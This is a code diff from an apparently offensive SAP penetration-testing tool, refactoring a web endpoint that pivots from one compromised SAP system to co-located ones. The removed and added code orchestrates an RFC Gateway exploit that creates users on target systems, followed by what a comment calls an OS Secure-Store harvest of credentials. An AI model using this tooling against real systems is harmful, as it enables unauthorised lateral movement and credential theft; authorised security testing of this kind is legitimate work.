@@ -10212,46 +10212,18 @@ def create_app(api: SAPMAPApi) -> Bottle:
             return json.dumps({"error": f"Node {sid} not found"})
         target_sid = (data.get("target_sid") or "").strip()
 
-        own_ips = set(node.all_ips() or [])
-        targets = []
-        for c in (node.colocated_sids or []):
-            if not c.get("plotted"):
-                continue
-            tsid = c.get("sid")
-            if target_sid and tsid != target_sid:
-                continue
-            tnode = api.state.get_node(tsid)
-            if tnode is None:
-                for n in api.state.nodes.values():
-                    if ((n.sid or "").split("@")[0] == tsid
-                            and (set(n.all_ips() or []) & own_ips)):
-                        tnode = n
-                        break
-            if tnode is not None and tnode.sid != node.sid and tnode not in targets:
-                targets.append(tnode)
+        from sap_colocation import _resolve_same_host_targets, pivot_colocated
+        targets = _resolve_same_host_targets(node, api.state,
+                                             only_sid=target_sid or None)
         if not targets:
             return json.dumps({"error": "no co-located plotted system to pivot "
                                         "to — run discovery, and scan the "
                                         "co-located system first"})
 
         def _run():
-            for tnode in targets:
-                try:
-                    print(f"[*] {sid}: pivoting to co-located {tnode.sid} on "
-                          f"{tnode.ip or tnode.hostname} via its RFC Gateway")
-                    created = sapmap_exploit.create_user_gw_exploit(
-                        tnode, api.state)
-                    if created:
-                        api.state.track_created_user(created)
-                        sapmap_exploit._post_exploit_enrichment(
-                            tnode, api.state, proven_type="ABAP")
-                        print(f"[+] {sid}: co-located {tnode.sid} owned via "
-                              f"Gateway pivot")
-                    else:
-                        print(f"[-] {sid}: Gateway pivot to {tnode.sid} did "
-                              f"not succeed")
-                except Exception as e:
-                    print(f"[-] {sid}: pivot to {tnode.sid} error: {e}")
+            # Shared orchestration (Gateway, then OS Secure-Store harvest) —
+            # same routine the automatic post-ownership pivot uses.
+            pivot_colocated(node, api.state, only_sid=target_sid or None)
 
         _bg(f"{sid}:pivot_colocated", "Pivot to Co-located", _run)
         return json.dumps({"status": "started",
